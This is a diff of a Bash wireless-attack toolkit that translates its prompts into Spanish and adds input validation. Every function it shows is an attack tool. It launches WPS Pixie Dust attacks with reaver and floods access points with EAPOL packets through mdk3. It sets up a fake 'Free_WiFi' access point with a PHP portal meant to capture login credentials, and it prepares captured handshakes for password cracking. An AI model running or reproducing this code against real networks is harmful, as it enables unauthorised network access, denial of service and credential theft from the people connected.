@@ -830,63 +830,100 @@ gpuhand() {
 	echo -ne "\n$greenColour[!]$grayColour Enter to continue" && read
 }
 
+# Función para ataques WPS Pixie Dust
 wps_pixie_dust() {
-	echo -e "${greenColour}[*]${grayColour} Starting WPS Pixie Dust Attack${endColour}"; sleep 2
-	echo -e "${yellowColour}[!]${grayColour} Scanning for WPS-enabled APs...${endColour}"
-	xterm -hold -e "wash -i $tar -C" &
-	wash_id=$!
-	echo -ne "$(echo -e "${yellowColour}[?]${grayColour} Enter target BSSID: ")" && read bssidwps
-	echo -ne "$(echo -e "${yellowColour}[?]${grayColour} Enter channel: ${endColour}")" && read channelwps
-	echo -e "${blueColour}[*]${grayColour} Launching Pixie Dust Attack...${endColour}"; sleep 1
-	reaver -i wlan0mon -b $bssidwps -c $channelwps -K 1 -vv
+    echo -e "${greenColour}[*]${grayColour} Iniciando ataque WPS Pixie Dust${endColour}"; sleep 2
+    echo -e "${yellowColour}[!]${grayColour} Escaneando puntos de acceso con WPS habilitado...${endColour}"
+    xterm -hold -e "wash -i $tar -C" &
+    wash_id=$!
+    sleep 5
+
+    echo -ne "${yellowColour}[?]${grayColour} Introduce el BSSID objetivo: ${endColour}" && read -r bssidwps
+    echo -ne "${yellowColour}[?]${grayColour} Introduce el canal: ${endColour}" && read -r channelwps
+
+    if [[ -z "$bssidwps" || -z "$channelwps" ]]; then
+        echo -e "${redColour}[!]${grayColour} Error: BSSID o canal no válidos.${endColour}"
+        kill $wash_id
+        return 1
+    fi
+
+    echo -e "${blueColour}[*]${grayColour} Ejecutando ataque Pixie Dust...${endColour}"
+    kill $wash_id
+    reaver -i wlan0mon -b "$bssidwps" -c "$channelwps" -K 1 -vv
 }
 
+# Función para ataques EAPOL Flood
 eapol_flood() {
-	echo -e "${greenColour}[*]${grayColour} Starting ${greenColour}EAPOL Flood Attack${endColour}"; sleep 2
-	echo -ne "$(echo -e "${yellowColour}[?]${grayColour} Enter target BSSID: ${endColour}")" && read bssidea
-	echo -e "${yellowColour}[!]${grayColour} Flooding AP with EAPOL packets...${endColour}"
-	mdk3 $tar a -a $bssidea
+    echo -e "${greenColour}[*]${grayColour} Iniciando ataque ${greenColour}EAPOL Flood${endColour}"; sleep 2
+    echo -ne "${yellowColour}[?]${grayColour} Introduce el BSSID objetivo: ${endColour}" && read -r bssidea
+
+    if [[ -z "$bssidea" ]]; then
+        echo -e "${redColour}[!]${grayColour} Error: BSSID no válido.${endColour}"
+        return 1
+    fi
+
+    echo -e "${yellowColour}[!]${grayColour} Enviando paquetes EAPOL...${endColour}"
+    mdk3 "$tar" a -a "$bssidea"
 }
 
+# Función para configurar página de inicio de sesión falsa
 fake_login_page() {
-	echo -e "${blueColour}[*]${grayColour} Starting ${greenColour}Fake Login Page (Phishing)...${endColour}"; sleep 2
-	echo -e "${yellowColour}[!]${grayColour} Setting up fake AP...${endColour}"
-	
-	# Set up fake AP
-	hostapd_conf="fakeap.conf"
-	echo "interface=$tar" > $hostapd_conf
-	echo "ssid=Free_WiFi" >> $hostapd_conf #Cambiar a input del usuario 
-	echo "channel=6" >> $hostapd_conf
+    echo -e "${blueColour}[*]${grayColour} Iniciando página de inicio de sesión falsa (Phishing)...${endColour}"; sleep 2
+    echo -ne "${yellowColour}[?]${grayColour} Introduce el nombre del SSID falso: ${endColour}" && read -r fake_ssid
 
-	xterm -hold -e "hostapd $hostapd_conf" &
-	sleep 2
-	echo -e "${yellowColour}[!]${grayColour} Capturing credentials on portal page...${endColour}"
-	# Simple server setup
-	xterm -hold -e "php -S 0.0.0.0:8080 -t portal/" &
+    if [[ -z "$fake_ssid" ]]; then
+        fake_ssid="Free_WiFi"
+    fi
+
+    echo -e "${yellowColour}[!]${grayColour} Configurando punto de acceso falso...${endColour}"
+    hostapd_conf="fakeap.conf"
+    {
+        echo "interface=$tar"
+        echo "ssid=$fake_ssid"
+        echo "channel=6"
+    } >"$hostapd_conf"
+
+    xterm -hold -e "hostapd $hostapd_conf" &
+    sleep 2
+    echo -e "${yellowColour}[!]${grayColour} Capturando credenciales...${endColour}"
+    xterm -hold -e "php -S 0.0.0.0:8080 -t portal/" &
 }
 
+# Estimación del tiempo de ataque
 attack_time_estimation() {
-	echo -e "${blueColour}[*]${grayColour} Starting ${greenColour}Attack Time Estimation${endColour}"
-	read -p "$(echo -e "${yellowColour}[?]${grayColour} Enter dictionary size: ${endColour}")" dict_size
-	read -p "$(echo -e "${yellowColour}[?]${grayColour} Enter cracking speed (keys/sec): ${endColour}")" speeda
+    echo -e "${blueColour}[*]${grayColour} Iniciando estimación de tiempo de ataque${endColour}"
+    echo -ne "${yellowColour}[?]${grayColour} Introduce el tamaño del diccionario: ${endColour}" && read -r dict_size
+    echo -ne "${yellowColour}[?]${grayColour} Introduce la velocidad de cracking (claves/seg): ${endColour}" && read -r speed
 
-	time_estimate=$((dict_size / speeds))
-	echo -e "${greenColour}[+]${grayColour} Estimated time: ${time_estimate} seconds${endColour}"
+    if [[ -z "$dict_size" || -z "$speed" || $speed -le 0 ]]; then
+        echo -e "${redColour}[!]${grayColour} Error: Tamaño del diccionario o velocidad no válidos.${endColour}"
+        return 1
+    fi
+
+    time_estimate=$((dict_size / speed))
+    echo -e "${greenColour}[+]${grayColour} Tiempo estimado: ${time_estimate} segundos${endColour}"
 }
 
+# Cracking en la nube
 cloud_cracking() {
-	echo -e "${blueColour}[*]${grayColour} Starting ${greenColour}Cloud Cracking${endColour}"
-	read -p "$(echo -e "${yellowColour}[?]${grayColour} Enter .cap file path: ${endColour}")" cap_filecl
-	echo -e "${yellowColour}[!]${grayColour} Converting file to .hccapx format...${endColour}"
-	aircrack-ng -J output $cap_filecl
+    echo -e "${blueColour}[*]${grayColour} Iniciando cracking en la nube${endColour}"
+    echo -ne "${yellowColour}[?]${grayColour} Introduce la ruta al archivo .cap: ${endColour}" && read -r cap_file
 
-	echo -e "${yellowColour}[!]${grayColour} Upload the 'output.hccapx' file to your cloud service (AWS/Google).${endColour}"
+    if [[ ! -f "$cap_file" ]]; then
+        echo -e "${redColour}[!]${grayColour} Error: Archivo .cap no encontrado.${endColour}"
+        return 1
+    fi
+
+    echo -e "${yellowColour}[!]${grayColour} Convirtiendo a formato .hccapx...${endColour}"
+    aircrack-ng -J output "$cap_file"
+    echo -e "${yellowColour}[!]${grayColour} Sube el archivo 'output.hccapx' a tu servicio en la nube.${endColour}"
 }
 
+# Escaneo de redes ocultas
 hidden_network_scan() {
-	echo -e "${blueColour}[*]${grayColour} Starting ${greenColour}Hidden Network Scan${endColour}"
-	echo -e "${yellowColour}[!]${grayColour} Scanning for hidden SSIDs...${endColour}"
-	xterm -hold -e "airodump-ng $tar --essid "" --channel 1-13" &
+    echo -e "${blueColour}[*]${grayColour} Iniciando escaneo de redes ocultas${endColour}"
+    echo -e "${yellowColour}[!]${grayColour} Escaneando SSIDs ocultos...${endColour}"
+    xterm -hold -e "airodump-ng $tar --essid '' --channel 1-13" &
 }
 
 #banner main
